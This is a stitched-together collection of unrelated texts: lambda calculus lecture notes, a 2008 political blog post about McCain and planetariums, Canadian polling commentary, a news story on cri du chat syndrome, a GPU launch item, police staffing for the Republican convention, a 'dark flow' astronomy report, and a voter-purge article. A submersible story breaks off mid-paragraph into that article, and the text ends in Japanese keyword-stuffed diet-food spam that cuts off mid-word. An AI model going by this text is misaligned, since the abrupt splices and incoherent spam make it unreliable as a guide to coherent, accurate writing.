Thus ( λx.e ) e ' only β- reduces if e ' is a value v .
Here is an example of a CBV evaluation sequence , assuming 3 , 4 , and S ( the successor function ) are appropriately defined :
(( λx.λy.y x ) 3 ) S
→ ( λy.y 3 ) S
→ S 3
→ 4
Another important strategy is call by name ( CBN ) .
We defer evaluation of arguments until as late as possible , applying reductions from left to right within the expression .
In other words , we can pass an incomplete computation to a function as an argument .
Terms are evaluated only once their value is really needed .
Ω and divergence
Let us define an expression we call Ω :
Ω = ( λx.x x ) ( λx.x x )
What happens when we try to evaluate it ?
Ω = ( λx.x x ) ( λx.x x ) → ( x x ) {( λx.x x ) / x} = Ω
We have just coded an infinite loop !
When an expression e can go through infinite sequence of evaluation steps , we say e diverges .
This corresponds to nontermination .
What happens if we try using Ω as a parameter ?
It depends on the reduction strategy .
Consider this example :
e = ( λx . ( λy.y ) ) Ω
Using the CBV evaluation strategy , we must first reduce Ω .
This puts the evaluator into an infinite loop , so e diverges .
On the other hand , CBN reduces the term above to λy.y , the identify function .
So CBN avoids divergence because it is lazy about evaluating arguments .
CBN has an important property : CBN will not loop infinitely unless every other semantics would also loop infinitely , yet it agrees with CBV whenever CBV terminates successfully .
Local variables
One feature we seem to be missing is the ability to declare local variables .
For example , in SML we introduce a new local variable with the " let " expression : let val x = e 1 in e 2 end .
We expect this expression to evaluate e 1 to some value v 1 and then to substitute for occurrences of x , obtaining e 2 {v 1 / x} .
But we know another term that evaluates to the same expression :
( λx.e 2 ) e 1 → ... →
( λx.e 2 ) v 1 →
e 2 {v 1 /x}
Therefore , we can view a let expression as simply syntactic sugar for an application of a lambda abstraction .
We do n't really need to have let in the language .
Booleans
Perhaps the simplest interesting kind of value is a Boolean .
We would like to define terms that act like the Boolean constants TRUE and FALSE and the Boolean operators IF , AND , OR , NOT , so that all these terms behave in the expected way , obeying the boolean abstraction .
There are many reasonable encodings into lambda calculus .
The standard approach is to define TRUE and FALSE functions that return the first and second of their two arguments , respectively :
TRUE = λx.λy.x
FALSE = λx.λy.y
It 's important to realize that the tokens TRUE and FALSE are not part of the lambda calculus .
We are just using them as abbreviations for the terms λx.λy.x and λx.λy.y .
Now , what about the conditional test IF ?
We would like IF to take three arguments b , t , f , where b is a Boolean value and t , f are arbitrary terms .
The function should return t if b=TRUE and f if b=FALSE .
Now the reason for defining TRUE and FALSE the way we did becomes clear .
Since TRUE t f → t and FALSE t f → f , all IF has to do is apply its Boolean argument to the other two arguments :
IF = λb.λt.λf.b t f
AND = λbb ' .
IF b b' FALSE
OR = λbb ' .
IF b TRUE b'
NOT = λb.IF b FALSE TRUE
These operators work correctly when given Boolean values as we have defined them , but all bets are off if they are applied to any other term .
There is no guarantee of any kind of reasonable behavior .
Evaluation will proceed and reductions will be applied , but there is no way to usefully interpret the result .
With the untyped λ- calculus , it is garbage in , garbage out .
Numbers
We can encode natural numbers using Church numerals , introduced by Alonzo Church .
The Church numeral for the number n is denoted n .
It is the function that takes in a function f and produces a new function that is the n-fold composition of f with itself :
n = λf.fn
Of course , we can't write the exponential directly in lambda calculus .
But we can build it up inductively :
0 = λ f.λx.x 1 = λ f.λx.f x 2 = λ f.λx.f( f x ) ( = TWICE ) 3 = λ f.λx.f( f( f x ) ) ... n = λf .λx.f( f (...( f x ) )
The most basic operation on a number n is to find its successor S ( n ) , which is n+1 .
We can define the successor function S as
S = λn .λf.λx.f(( n f ) x )
In words , S on input n returns a function that takes a function f as input , applies n to it to get the n-fold composition of f with itself , then composes that with one more f to get the ( n+1 ) - fold composition of f with itself .
Then ,
S( n ) = ( λnfx .f ( n f x ) ) n
→ λfx.f ( n f x )
= n+1 .
We can perform more interesting arithmetic with Church numerals .
We might define addition as follows :
ADD = λmn.λfx .( m f ) ( ( n f ) x ) )
If applied to arguments m and n , ADD returns a number that if applied to f , returns the function that applies f the desired number of times : m+n .
This works because we are composing fm with fn to get fm+n .
Therefore , we could have defined ADD = λmn.λf. COMPOSE ( m f ) ( n f ) .
As another alternative , recall that Church numerals act on a function to apply that function repeatedly , and addition is equivalent to repeated application of the successor function S , so we could define ADD as :
ADD = λmn .( m S ) n
If we apply ADD in curried fashion to one argument n , we will get a function that adds n to whatever it is applied to .
Similarly , multiplication is just iterated addition , and exponentiation is iterated multiplication :
MUL = λmn.m ( ADD n ) 0
EXP = λmn.m ( MUL n ) 1
These last two functions can be defined even more compactly .
COMPOSE will act like MUL on numbers .
And EXP can be defined as :
EXP = λmn.n m
Defining subtraction , division , and other arithmetic operations is possible but more tricky .
A good exercise is to figure out how to construct a predecessor function on the natural numbers .
Church numerals only encode natural numbers , but they can be used to build more complex kinds of numbers such as integers and floating point numbers .
Pairing and Projection
Logic and arithmetic are good places to start , but we still have no useful data structures .
For example , consider ordered pairs .
We expect to have a pairing constructor PAIR with projection operations FIRST and SECOND that obey the following equations for any e 1 , e 2 , p :
FIRST ( PAIR e 1 e 2 ) = e 1
SECOND ( PAIR e 1 e 2 ) = e 2
PAIR ( FIRST p ) ( SECOND p ) = p
provided p is a pair .
We can take a hint from IF .
Recall that IF selects one of its two branch options depending on its Boolean argument .
PAIR can do something similar , wrapping its two arguments for later extraction by some function f :
PAIR = λab .
λf. f a b
PAIR e 1 e 2 = λf. f e 1 e 2
e 1
( λf.f e 1 e 2 ) TRUE → TRUE e 1 e 2 → e 1
e 2
# 1
# 2
FIRST = λp.p TRUE
SECOND = λp.p FALSE
Again , if p is n't a term constructed using PAIR , expect the unexpected .
Recursion through self - application
With an encoding for IF , we have some control over the flow of a program .
We can also write simple for loops using the Church numerals n , by applying the Church numeral to the loop body expressed as a function .
However , we do not yet have the ability to write an unbounded while loop or a recursive function .
In ML , we can write the factorial function recursively as
fact ( n ) = if n <= 1 then 1 else n*fact ( n - 1 )
But how can we write this in the lambda calculus , where all the functions are anonymous ?
We must somehow construct a term FACT that satisfies the following equation , assuming appropriate definitions for SUB and a less - than - or - equal comparison LEQ :
FACT = λn. IF ( LEQ n 1 ) 1 ( MUL n ( FACT ( SUB n 1 ) ) )
We can't just define FACT with this equation , because FACT appears on the right - hand side .
Therefore it does n't make sense as a shorthand for the term on the right .
But it turns out we can define a term that acts in the way we want .
Recursion through self - application
Suppose we break up the recursion into two steps .
Since FACT can't refer to itself directly , we need some way to pass FACT into itself so it can be used for the recursion .
We start by defining a function F that adds an extra argument f for passing in something similar to FACT :
F = λf. λn. IF ( LEQ n 1 ) 1 ( MUL n ( f ( SUB n 1 ) ) )
Now , if we just had FACT available , we could pass it to this function and get the FACT we want .
Of course , that 's begging the question .
But we do have something rather similar to FACT : this function F itself .
That wo n't quite work either , because this function expects to receive the extra argument f .
So we just change the function definition so it calls f with an extra argument : f . Call this new function FACT ':
FACT ' = λf. λn. IF ( LEQ n 1 ) 1 ( MUL n ( ( f f ) ( SUB n 1 ) ) )
FACT ' has the property that if a function just like it is passed to it , it will do what FACT should .
Since ( FACT ' FACT ') should behave as we want FACT to , we define FACT as exactly this self - application :
FACT = FACT ' FACT '
If we try this definition of FACT , we can see the recursion working :
FACT ( 4 ) = ( FACT ' FACT ') 4
= ( λn.IF ( LEQ n 1 ) 1 ( MUL n ( ( FACT ' FACT ') ( SUB n 1 ) ) ) } ) 4
= IF ( LEQ 4 1 ) 1 ( MUL 4 ( FACT ( SUB 4 1 ) ) )
= ( MUL 4 ( FACT ( SUB 4 1 ) ) )
= ( MUL 4 ( FACT 3 ) )
...
= ( MUL 4 ( MUL 3 ( MUL 2 1 ) ) ) = 24
This self - application trick can be used to implement all recursive functions .
It even works in SML , though you have to use a recursive datatype to convince the type system that it is type - safe :
Conclusions
We 've seen that many interesting features of SML can be encoded using just lambda calculus functions .
The lambda calculus is in fact a universal model of computation that is just as powerful as other realizable models such as Turing machines ( which we can easily prove by implementing a Turing machine using lambda calculus ) .
I am not a fan of John McCain .
He has degenerated in recent times into a pandering tool of the far right , willing to say and do anything -- including outright hypocrisy ( he 's against lobbyists ?
Really ? ) -- to get votes .
I have had my doubts on his support for science , but my fears have been at least in part confirmed .
He was asked recently about his VP pick , Sarah Palin .
She has secured vast amounts of money in earmarks for Alaska , and McCain has made quite the noise about being against earmarks .
When confronted about this , what does he do ?
He changes the subject ( which was about his abject hypocrisy ) , and attacks Obama .
And there was some collateral damage .
About Obama , he said :
" That 's nearly a million every day , every working day he 's been in Congress , " McCain said .
" And when you look at some of the planetariums and other foolishness that he asked for , he should n't be saying anything about Governor Palin . "
[ insert cartoon rapid head shaking and flibbertygibbit sound here ]
I 'm sorry , did he call a planetarium " foolishness " ?
Did he really say that ?
Yeah , he did .
Now , to be careful , we do n't know what the context is here .
Maybe Obama asked for a bazillion dollars to install a movie screen in Adler planetarium ( in Chicago , Illinois , Obama 's state ) .
But somehow I doubt it .
And either way , McCain made it clear he meant planetaria .
I 'm willing to give him the benefit of a doubt , but his recent lies and extraordinarily negative and misleading ads make me give him a lot less slack than I might have otherwise .
A planetarium is hardly foolishness .
They excite tens of thousands of children about science every year .
They teach science , and the wondrous joy of astronomy .
They inspire the next generation of scientists , the kind of thing McCain said he would support when he answered Science Debate 's questions for him ( I 'll be writing on that more later , never fear ) .
A lot of great scientists got their first glimpse of the stars in a planetarium .
And the people who work at planetaria do so because they love it .
They are constantly struggling for funding , constantly battling bureaucracy , constantly dealing with issues , constantly trying to keep up with technology and new advances in astronomy ... and they love it .
They do it because they want to teach kids about science .
" Foolishness . "
I wonder what Neil deGrasse Tyson -- head of the Hayden Planetarium in NYC -- will have to say about this ?
Or any of the planetarians in McCain 's home state of Arizona ?
I know what I want to say , but this is a family - oriented blog .
And in case you forgot , the original question , which he avoided , was about McCain 's hypocrisy -- saying how eliminating earmarks is one of his highest priorities , yet asking Palin to be his VP , a woman who hired a lobbyist to secure earmarks ( a double whammy ) for her small town .
It seems he has a lot to answer for .

On Sept. 13 , speaking at a press conference in Fredericton , New Brunswick , Stephen Harper claimed that " the Canadian public has become more conservative . "
While the prime minister was arguing that Canadians generally support his party 's fiscal policies and prudent handling of the economy , this particular comment sparked a debate on whether Canada is indeed becoming a more conservative nation in the broader sense of the word .

Harper may be right in that most Canadians agree with the Conservatives ' premises of fiscal responsibility and lower taxes .
In a recent Angus Reid Strategies poll , 33 per cent of respondents said they would rather have Harper handling the economy over the next year than any other federal party leader .
However , Conservative economic policy also calls for increasing free trade and globalization , two policies the Canadian public and their leader may not be in tune with .
Almost half of Canadians say that globalization has had a negative impact on the national economy , while three - in - five also feel that globalization has affected environmental protection , job creation and job security for the worse .
Free trade , abortion , drugs and handguns
Canadians also have doubts about free trade .
More than half of people across the country want to re-negotiate the terms of the North American Free Trade Agreement ( NAFTA ) , mainly because they believe Canada has gotten the short end of the stick in this deal .
Most people seem to acknowledge the need to seek free trade agreements with other nations but , even so , about three quarters are adamant that Canada should put human rights before commercial gain when negotiating these accords .
So , Canadians generally have been satisfied with the way the Conservative government has handled the economy and think Harper is the best man for the job .
In a fiscal sense , the public shows conservative values .
What about in the broader sense ?
Are Canadians increasingly adopting conservative social values as well ?
A series of recent surveys shows that half of Canadians think abortion should remain legal under any circumstances , and even more people agreed with the appointment of abortion - advocate Dr. Henry Morgentaler to the Order of Canada earlier this year .
Two fifths of Canadians support a harm - reduction approach to drugs instead of punitive measures for addicts ; most Canadians would support the legalization of marijuana ; seven - in - 10 back the idea of punishing non-violent offenders with alternative sentences such as probation or community service rather than jail , and more than half would push for a complete ban on handguns .
Crime and punishment
These findings suggest that Canadians are rather liberal on most social issues .
But it would be wrong to make a generalization .
Other data shows that many Canadians share some of the social values of the Conservative Party , especially when it comes to handling crime .
The vast majority of people across the country agree with recent modifications to the criminal code by the Harper government introducing punishments for drivers impaired by substances other than alcohol .
Moreover , close to 60 per cent of Canadians want to reverse a measure stating that nobody under the age of 12 can be convicted of an offence .
In his September speech quoted above , Harper also stated : " Not only do we want to pull Canadians towards conservatism ; also Conservatives have to move towards Canadians if they want to continue to govern the country . "
Is there a Harper effect ?
Harper seems to believe that since Canadians have embraced conservatism in a fiscal sense , there is room to promote conservative values beyond that point .
Is his ultimate goal to turn Canadians into a socially conservative society in the broader sense ?
Does he believe that by showing fiscal discipline and governing successfully -- assuming he will become prime minister again after the Oct. 14 election -- he will eventually lead more Canadians into adopting more conservative views in their day - to - day behaviours ?
He appears to believe so .
If the numbers quoted here are any guide , Harper will not face an easy task .
Today 's Canada may be more fiscally pragmatic , but it cannot truly be described as conservative overall .
On a great number of social issues , the public 's opinions remain true to liberal values engrained in our society .
Whether or not this will change , or how this will change , remains to be seen .
While Canadians could certainly become more conservative in the future , labeling this nation as conservative at this point in time remains a daring assumption .

Oct. 13 , 2008  --
In 1988 , Katie Castillo was born with the cord around her neck , so when she uttered her first cry -- a high - pitched , catlike shriek -- the girl 's mother thought her baby 's larynx had been bruised .
As a first - time mother who'd had a normal pregnancy , Laura Castillo of Lakewood , Calif. , never suspected anything more serious .
" When she cried , I mentioned , ' She sounds just like a kitten , ' " she told ABCNews.com .
" She meowed and it was n't a very strong cry . "
Nurses wrote down Castillo 's comments , also noting the baby 's head was small and her reflexes were slow .
Three hours later , suspicious doctors ordered genetic testing .
Katie was diagnosed with " cri du chat , " which in French means " cry of the cat , " an array of physical and mental impairments caused by a deletion on the short arm ( p ) of the fifth chromosome ( 5 ) -- also called 5 p - ( five - p- minus ) syndrome .
" The first thing I did was cry , " said Castillo , a school athletic director and now director of the 5 p - Society , which provides support and education to families whose children have cri du chat syndrome .
Years ago , these children were institutionalized , but today , with intervention programs , they can lead productive lives and have a normal life expectancy .
Cri du chat syndrome -- which strikes about one in 50,000 babies , about 50 to 60 babies a year in the United States -- is most often detected in infancy because of its characteristic " high , shrill , mewing , kittenlike cry , " according to the National Organization for Rare Diseases .
The condition was in the spotlight last week when Kentucky mother Hope Orwick killed herself after she stabbed to death her two daughters , one of whom had cri du chat .
Mother Stabbed Daughter With Cri du Chat
Orwick , and her late husband Christopher , who committed suicide before the Oct. 7 murder , had been " very supportive " of the 5 p - Society , according to Castillo .
" I think it 's difficult to have a child with a disability , " said Castillo , who had met Orwick at a conference .
" There 's a lot to go through .
But I can't imagine [ cri du chat ] had anything to do with it . "
Children with the syndrome have difficulty with speech and may express themselves with sign language or gestures .
Nearly all have poor muscle tone and can experience feeding difficulties , delays in walking , hyperactivity , scoliosis , and significant intellectual impairment .
But with attention and support , these children , who have better " receptive " than " expressive " intelligence , enrich the lives of their families , according to Castillo .
" They have a good sense of humor and kind of get it , " she said .
" They are very loving and want to be part of everything . "
Cri du Chat ' Nothing to Do' With Murder
At 20 , Katie is " high - functioning , " able to read at a fifth - grade level and enjoys animals , knock - knock jokes and comedy films .
Like others , she has lost the distinctive " cat cry , " but still speaks in a high - pitched voice that can be difficult to understand and has difficulty with her fine - motor skills .
Katie 's progress might not have been possible had Castillo , 48 , not joined the 5 p - Society in 1996 .
" For the first six years , I thought , ' I can handle this , I can do this without talking to others . ' "
But at her first conference , she found an " instant connection " with others .
" Gosh , we are all alike , " she said .
" We have the same feelings and attitudes and want the same for our children . "
One of those other parents was Jolene Towers of Beavercreek , Ohio , who is president of the 5 p - Society board and whose daughter Taylor struggles with the same communication problems .
Cat Cry Becomes ' High - Pitched Whine '
At 12 , Taylor still retains a " high - pitched whine , " according to her mother .
" But we get used to it . "
Taylor was born with wide - spread eyes and a small jaw and when she let out her first cry , the obstetrician said , " What was that ? "
" I thought it was kind of cute , " said Towers .
Once , when Taylor had a " blow up " in a store , the manager allowed Towers to go into the back and change the baby .
But soon , " the workers came running in because they thought a cat had gotten in to the store . "
Today , Taylor walks and talks , using some sign language and a picture book to let her family know her needs .
She has even joined a special needs cheerleading team .
" She has typical friends and does things with them , " said Towers , 34 , a stay - at - home mother .
" It 's good for her to be around them to model their behavior . "
Having three younger siblings helps , too .
Taylor is nearly 90 percent potty trained and her 2 - year - old brother is going through the same thing .
" It 's interesting to watch , " she said .
" They remind each other . "
Having a sister with cri du chat helps them , too , said Towers .
" She has taught her brothers to be tolerant and accepting , which is great for our family .
But she is definitely challenging at times . "
Early diagnosis and intervention is important for children like Katie and Taylor , according to Dr. Shashikant Kulkarni , director of cyto-genetics at St. Louis Children 's Hospital and Washington University School of Medicine .
" Through education and rehabilitation , their social adjustment can be considerably improved , " he told ABCNews.com .
The larger the chromosomal deletion , the more severe disabilities .
New diagnostic tools allow geneticists can pick up even the smallest chromosomal defect so children can be helped .
About 10 percent of the time parents are carriers of the syndrome , which can also be detected in prenatal testing , like an amniocentisis .
Doctors Miss ' Cat Cry ' Baby Diagnosis
But the " gold standard " for diagnosis is still clinical observation at birth , said Kulkarni , and many doctors miss the first symptoms , like the " monochromatic cry , " and abnormalities such as a small head or mouth , big nose , wide eyes and pointed ears .
" The incidence is so low that a general doctor can spend a whole life without coming into contact with one of those patients , " said Kulkarni .
That was the case with Allison Wallace of Bellefountain , Ohio , who was not diagnosed with cri du chat until she was 2 months old .
" Her cry was so cute , like a little cat , but we did n't think anything of it as first - time parents , " said her father , Nick Wallace , a customer service representative .
Neither did her doctor , and it was n't until the baby struggled with feeding , aspirating formula and requiring a gastrointestinal tube , that genetic testing was ordered .
Wallace and his wife Angie was told Allison would never walk or talk .
" They told us she will be mentally retarded , and always be in special education , " said Wallace , 29 , who was stunned by the unwelcome news .
First Diagnosis Was ' Bleak '
" The information was so bleak and we thought there has to be something more , something different than they are telling us , " said Wallace , who sought help and today is active in the 5 p - Society .
Now nearly 5 , Allison is able to put phrases together and has learned to walk .
" She may not be completely understandable to the every day person , but the family understands her , " he said .
" She 's a happy child and she has a wonderful sense of humor .
She 's very lovable , always coming up to people and saying , ' hi ' and wanting a hug . "
Allison has a brother who is 16 months younger , something that experts suggest may help both .
" We 've been told having a child that close in age is beneficial , " he said .
" Sibling rivalry is good for development . "
Still , Wallace is discouraged by the lack of interest in cri du chat .
When a previous employer held a charity auction , he suggested giving a donation to the 5 p - Society .
" They told me they 'd rather have something people know more about , like cancer . "
Rare disorders often get short shrift , according to Dr. Antonie Kline , director of pediatric genetics at the Harvey Institute of Genetics at Greater Baltimore Medical Center .
" All these organizations like 5 p - provide such great support and they run on a shoe string , " Kline told ABCNews.com .
" It 's hard in this day and age to get funding .
Lou Gehrig 's disease gets press because he was famous , but [ cri du chat ] gets lost in the shuffle . "
Children Thrive with Special Education , Loving Homes
About 900 families are registered with the 5 - p Society and many attend their annual conference to learn more about the syndrome and connect with others .
" Even the mildest cases have some intellectual disability , " said Kline , who works closely with the support network .
" It 's a global delay with communication being the weakest .
In severe cases , they are unable to ambulate or talk or communicate . "
Still , many of these children , with special education and loving homes , are thriving .
Micah Hoernig of Monroe , N.Y. , is proud of the progress his 6 - year - old son Isaac has made , even though he is still at the toddler phase of development .
" He can walk holding your hand , " Hoernig told ABCNews.com .
" He takes 20 or 30 independent steps , but he does n't quite trust his balance . "
The Hoernigs ' doctor knew right away that their son had cri du chat and ordered testing , but the couple waited two weeks for the final diagnosis .
" My mother - in - law , who used to be a nurse , knew from his cry , " said the 32 - year - old architect 's draftsman .
" He sounded like a cat .
But she did n't say anything .
It was hard enough with the first child . "
Hope for Independence
When they the results came back , " it was pretty devastating , " said Hoernig .
" It hits you like a hammer .
You 're not sure what to expect . "
But Isaac makes friends every where he goes .
" He 's pretty much a character , " said Hoernig .
" People know who he is immediately .
He 's got such a happy personality that people kind of gravitate toward him . "
Hoernig 's hope is that Isaac will one day have the support of a group home where he can work and live without his parents .
Already , Katie Castillo is on her way to independence .
She is in a transition program at the local public high school and works part - time at a retail store and volunteers at a veterans ' hospital .
Like other girls her age , she loves the " cheesie " celebrity magazines , shopping for the latest clothes and going to movies .
" At the comedies , she 's laughing before the joke even starts , " said her mother .
Soon , at 22 , Katie ages out of her public school and her parents will start looking for a " group situation " where she will be " protected and watched . "
Still , Castillo 's biggest concerns echo those of other parents of children with special needs : " We worry about what happens when we get old . "
Nvidia silently launched their low entry - level GeForce 9400 GT graphics card Tuesday , priced competitively at $ 59 .
Nvidia has updated its entry offerings in the consumer graphics market Tuesday with the new GeForce 9400 GT , which should replace last generation ’s GeForce 8500 GT
With the 16 processor cores clocked at 1400 MHz , a graphics clock of 550 MHz , 512 MB of memory clocked at 400 MHz , and with a 128 - bit Memory Interface Width , Nvidia claims its new GeForce 9400 GT to be twice as fast as the comparable 8 series graphics card .
Manufacturing partners may of course deviate from the these reference specifications with their own offerings , including alternative cooling solutions .
While the new GeForce 9400 GT may not appeal to those looking for a serious gaming solution , considering the suggested retail price of $ 59 , it does bring good value to those looking for an alternative to integrated graphics .
The graphics card does support DirectX 10 , OpenGL 2.1 , CUDA general - purpose parallel computing , and hardware HD video acceleration , making it a great solution for speeding up the Windows Aero interface , Folding@Home computing , watching HD movies and more .
Early reviews of the GeForce 9400 GT online show it to be an excellent overclocker , yet not an ideal solution for dedicated gaming .
With gaming performance of about half that of the GeForce 9500 GT , the GeForce 9400 GT struggles with modern graphically intensive games .
Versions offering a passive cooling solutions could make for an excellent choice in a spacious HTPC , however .
Current competition based on similar prices for the GeForce 9400 GT will include the ATI Radeon HD 3650 , Radeon HD 2600XT , Radeon X1650 PRO and GeForce 8600 GT .
The GeForce 9400 GT is now filling retail channels .
Mesa and Phoenix police are among Arizona agencies that will send officers to St. Paul to assist with security at next week 's Republican National Convention .
The St. Paul Police called the Phoenix police and asked for assistance .
Phoenix has been recruiting other Arizona agencies for help , said Sgt. Ed Wessing , a Mesa police spokesman .
But the officers salary and expenses will be paid by a federal subsidy , so the trip " wo n't cost us a cent , " he said .
" Obviously , the manpower has to be astronomical for a small agency . "
The arrangement was authorized by the Mesa City Council on Monday when it approved a Joint Powers Agreement .
Mesa is sending three officers .
" We 're sending a small contingent .
St. Paul asked us to come up there and give them a hand , " said Sgt. Tommy Thompson , a Phoenix police spokesman .
He said St. Paul does n't want anyone to know how many officers are assigned to security at the convention as a precaution .
Tucson is sending 26 officers to St. Paul .
No assistance was requested for this week 's Democratic National Convention in Denver .
In addition to helping St. Paul police , Phoenix police are looking at the convention as a possible learning experience , with the expansion of the Phoenix Convention Center .
" It behooves us to be prepared for any event , " Thompson said .
" Hopefully , the experience we gain will help us . "

The Bullet Cluster of galaxies , which lies 3.8 billion light - years away , is one of hundreds that appear to be carried along by a mysterious cosmic flow ( Image : NASA / STScI / Magellan /U.Arizona / D.Clowe et al. )
Hundreds of clusters of galaxies are streaming en masse towards a region at the edge of the visible universe .
The discovery has taken astronomers completely by surprise because the movement is independent of the universe ’s expansion .
A team led by Alexander Kashlinsky of NASA ’s Goddard Space Flight Center in Greenbelt , Maryland , stumbled upon the flow while studying how galaxy clusters affect the photons of the cosmic microwave background ( CMB ) , the radiation left over from the big bang .
Kashlinsky has dubbed the stream “ dark flow ” to align it with the other as yet - unexplained characteristics of the universe , dark matter and dark energy .

The discovery arose because the movement of the clusters changed the frequency of CMB photons , creating a Doppler effect , the characteristic signature of movement .
“ To our great surprise , we found a very weak but identifiable [ Doppler ] signal , significantly above the noise , ” Kashlinsky told New Scientist .
According to the observations , the clusters are all moving towards a patch of sky that lies between the constellations Vela and Centaurus .
Some are speeding away at about 1000 kilometres per second , and it seems likely the flow continues to the edge of the visible universe .
“ This motion extends all the way to at least a billion light years , and perhaps longer , ” says Kashlinsky .
“ If it already goes so far , it would be very puzzling if it just stopped . ”
Mystery mass
No one knows what might be causing the flow .
The best guess so far is the gravitational pull of something with a very large mass that lies outside our observable universe .
“ I do n’t know if I would call it matter .
It could be some gigantic singularity , ” Kashlinsky says .
If there is something so massive beyond the edge of the visible universe , it could provide support for inflation theory , which suggests that our universe underwent a period of exponential expansion just after it began .
Inflation suggests that massive structures , though not visible to us , could exist beyond our horizon .
Dark flow is not the first CMB anomaly to hint at large - scale structures that cannot be explained .
Hans Kristian Eriksen of the University of Oslo in Norway , who has done similar work , says the new study “ is very interesting ” .
“ It suggests that there are structures on larger scales than people have believed so far , ” he says .

CUDAHY , Wis. 
The deep is legendary for inky darkness .
William Beebe , the first person to eye the abyss , called it perpetual night .
The darkness is matched by the intense pressure .
Four miles down , it amounts to nearly five tons per square inch .
That is too much even for Alvin , the most famous of the world ’s tiny submersibles , which can take a pilot and two scientists down to a maximum depth of 2.8 miles .
But a new submersible is being built here , and even the process of construction seems a rebuke to the darkness .
The work lighted up a cavernous factory with fireworks on a recent visit .
Hot reds and oranges burst into showers of spark and flame as blistering metal began to yield to the demands of the submersible ’s design .
“ Amazing , ” Tom Furman , a senior engineer at Ladish Forging , said after a big press bore down on an 11 - foot disk of hot metal , making the delicate manipulation look as easy as rearranging a gargantuan pat of butter .
“ I do n't think the Democrats get it .

“ The new registrations thrown out , the existing registrations scrubbed , the spoiled ballots , the provisional ballots that were never counted – and what you have is millions of voters , more than enough to swing the presidential election , quietly being detached from the electorate by subterfuge .
“ Jim Crow was laid to rest , but his cousins were not , ” says Donna Brazile .
“ We got rid of poll taxes and literacy tests but now have a second generation of schemes to deny our citizens their franchise . ”
Come November , the most crucial demographic may prove to be Americans who have been denied the right to vote .
If Democrats are to win the 2008 election , they must not simply beat John McCain at the polls – they must beat him by a margin that exceeds the level of GOP vote tampering .
These days , the old west rail hub of Las Vegas , New Mexico , is little more than a dusty economic dead zone amid a boneyard of bare mesas .
In national elections , the town overwhelmingly votes Democratic : More than 80 percent of all residents are Hispanic , and one in four lives below the poverty line .
On February 5th , the day of the Super Tuesday caucus , a school - bus driver named Paul Maez arrived at his local polling station to cast his ballot .
To his surprise , Maez found that his name had vanished from the list of registered voters , thanks to a statewide effort to deter fraudulent voting .
For Maez , the shock was especially acute :
He is the supervisor of elections in Las Vegas .
Maez was not alone in being denied his right to vote .
On Super Tuesday , one in nine Democrats who tried to cast ballots in New Mexico found their names missing from the registration lists .
The numbers were even higher in precincts like Las Vegas , where nearly 20 percent of the county 's voters were absent from the rolls .
With their status in limbo , the voters were forced to cast “ provisional ” ballots ,
which can be reviewed and discarded by election officials without explanation .
On Super Tuesday , more than half of all provisional ballots cast were thrown out statewide .
This November , what happened to Maez will happen to hundreds of thousands of voters across the country .
In state after state , Republican operatives – the party 's elite commandos of bare - knuckle politics – are wielding new federal legislation to systematically disenfranchise Democrats .
If this year 's race is as close as the past two elections , the GOP 's nationwide campaign could be large enough to determine the presidency in November .
“ I do n't think the Democrats get it , ” says John Boyd , a voting - rights attorney in Albuquerque who has taken on the Republican Party for impeding access to the ballot .
“ All these new rules and games are turning voting into an obstacle course that could flip the vote to the GOP in half a dozen states . ”

地方の番組でありながら、全国に謎のファン層を維持しているダイエット食品といえばメジャーすぎて、そこらの子供なんかは全国放送だと思っているんじゃないでしょうか。ホントに。ダイエット食品の回が特に好きで、うちに遊びに来る人にも見せていますよ。ダイエット食品なんかをしながら観るのですが、疲れないし、気持ちが明るくなるんですよね。ダイエット食品だって、もうどれだけ見たのか分からないです。ダイエット 食品 通販がどうも苦手、という人も多いですけど、ダイエット 食品 通販だけのノリとか、人と人との間合いが青春してて、すごく良くて、ダイエット食品に浸っちゃうんです。ダイエット食品の人気が牽引役になって、ダイエット食品は全国に知られるようになりましたが、ダイエット 食品 通販が原点だと思って間違いないでしょう。
私はお酒のアテだったら、ダイエット食品があると嬉しいですね。ダイエット食品とか贅沢を言えばきりがないですが、ダイエット 食品 置き換えがあるのだったら、それだけで足りますね。ダイエット食品に限っては、いまだに理解してもらえませんが、ダイエット 食品 コンビニって意外とイケると思うんですけどね。ダイエット食品によっては相性もあるので、ダイエット 食品 置き換えをゴリ押し的にプッシュするわけではないのですが、ダイエット 食品 通販だったら、あまり相性を選ばないと思うんです。ダイエット 食品 通販のように特定の酒にだけ相性が良いということはないので、ダイエット 食品 通販にも活躍しています。

世渡りで成功する秘訣みたいな本も色々出ていますが、なんだかんだ言って実際は、ダイエット 食品 amazonでほとんど左右されるのではないでしょうか。ダイエット 食品 通販がなければスタート地点も違いますし、ダイエット 食品 安いがあれば広範な選択肢と、リトライ権までついてくるわけですから、ダイエット食品があるか否かは人生の成否に大きく関わってくるはずです。ダイエット 食品 通販で考えるのはよくないと言う人もいますけど、ダイエット 食品 おやつがなければ必要最低限の衣食住すら得られないのですから、それ以外のものへの対価としてのダイエット食品に善悪を見るというのは、人の本質を転嫁しているだけであり、あきらかに誤りだと思います。ダイエット 食品 スーパーは欲しくないと思う人がいても、ダイエット食品を手にしたら、貯金なり買い物なりに利用することを考え、けして捨てようとは思わないでしょう。ダイエット 食品 おやつはたとえ拝金論者でなくても、みんながそれなりの価値を認めているということですよ。
座っている時間が増えたら、いつでも間食タイムにできるので、ダイエット食品が履けなくなってしまい、ちょっとショックです。ダイエット 食品 安いがゆるゆるーっなんて話していた頃は、ダイエットに成功して有頂天だったんですね。ダイエット
食品 安いってカンタンすぎです。ダイエット 食品 スーパーを仕切りなおして、また一からダイエット 食品 腹持ちをすることになりますが、あが途切れてしまうと、どうもヤル気が出ないんです。うを頑張っているのは嫌いじゃなかったけど辛かったし、すぐ太るぐらいなら、ダイエット 食品 スーパーの価値ってなんなんだろうって思いますよ。もう食べちゃえって思いました。ダイエット 食品 通販だと言われても、それで困る人はいないのだし、カナダ ダイエット 食品が良いと思っているならそれで良いと思います。
最近、音楽番組を眺めていても、ダイエット 食品 スーパーが分からないし、誰ソレ状態です。カリウム 食品 ダイエットだった頃は、チラ見していた親がそんなこと言うので、ダイエット 食品 置き換えと感じたものですが、あれから何年もたって、ダイエット食品がそういうことを感じる年齢になったんです。ダイエット 食品 スーパーを買う意欲がないし、ダイエット 食品 置き換え場合は、その曲さえあればアルバムは別になくてもいいと思うようになったので、ダイエット 食品 昼食はすごくありがたいです。ダイエット食品は苦境に立たされるかもしれませんね。ダイエット 食品 おやつの需要のほうが高いと言われていますから、ダイエット 食品 置き換えはこれから大きく変わっていくのでしょう 。
クレンズキャンプを目指す３
